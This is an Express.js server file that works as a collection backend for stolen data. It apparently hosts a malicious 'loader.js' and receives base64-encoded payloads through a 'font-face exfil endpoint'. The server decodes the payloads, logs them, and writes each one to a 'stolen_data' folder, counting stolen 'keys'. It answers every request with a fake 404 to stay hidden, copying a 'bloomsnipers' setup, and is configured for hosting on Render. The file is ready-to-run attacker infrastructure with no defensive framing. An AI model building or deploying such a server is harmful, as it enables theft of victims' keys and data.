const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;   // ← THIS IS THE IMPORTANT LINE

// Serve your loader.js at /axiom/loader.js
app.use('/axiom', express.static(path.join(__dirname, 'public')));

// Catch-all for root and unknown paths (shows 404 like original)
app.get('/', (req, res) => {
    res.status(404).send('Not Found');
});

app.get('/i', (req, res) => {
    res.status(404).json({ detail: "Not Found" });
});

// The font-face exfil endpoint - this is where data arrives
app.get('/i/:data', (req, res) => {
    const encoded = req.params.data;
    let payload = {};

    try {
        const jsonString = Buffer.from(encoded, 'base64').toString();
        payload = JSON.parse(jsonString);

        // Log to Render Logs (you will see this!)
        console.log('✅ DATA RECEIVED:', JSON.stringify(payload, null, 2));

        // Save to file (persists on Render disk)
        const logDir = path.join(__dirname, 'stolen_data');
        if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);

        const filename = `stolen_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
        fs.writeFileSync(path.join(logDir, filename), JSON.stringify(payload, null, 2));

        console.log(`💾 SAVED to stolen_data/${filename} | ${payload.keys ? payload.keys.length : 0} keys`);
    } catch (e) {
        console.error('❌ Decode error:', e.message);
    }

    // Always return 404 like the original bloomsnipers setup
    res.status(404).json({ detail: "Not Found" });
});

// Start the server on the correct Render port
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Loader URL: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-app'}.onrender.com/axiom/loader.js`);
    console.log(`📥 Data endpoint: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-app'}.onrender.com/i/...`);
});